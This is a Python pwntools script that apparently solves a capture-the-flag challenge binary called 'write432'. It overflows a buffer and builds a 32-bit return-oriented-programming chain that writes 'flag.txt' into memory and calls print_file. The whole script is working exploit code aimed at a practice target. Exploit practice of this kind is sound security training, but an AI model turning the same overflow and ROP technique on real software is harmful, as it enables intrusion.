from pwn import *

exe = ELF("./write432", checksec=False)
p = process(exe.path)

bss_addr = exe.bss()
pop_edi_ebp = 0x080485aa  # pop edi ; pop ebp ; ret
mov_edi_ebp = 0x08048543  # mov dword ptr [edi], ebp ; ret

payload  = b"A"*44

payload += p32(pop_edi_ebp)
payload += p32(bss_addr) 
payload += b"flag"  
payload += p32(mov_edi_ebp)

payload += p32(pop_edi_ebp)
payload += p32(bss_addr+4)
payload += b".txt"
payload += p32(mov_edi_ebp)

payload += p32(exe.symbols['print_file'])
payload += p32(0xdeadbeef)
payload += p32(bss_addr) 

p.sendlineafter('>', payload)
print(p.recvall().decode(errors="ignore"))
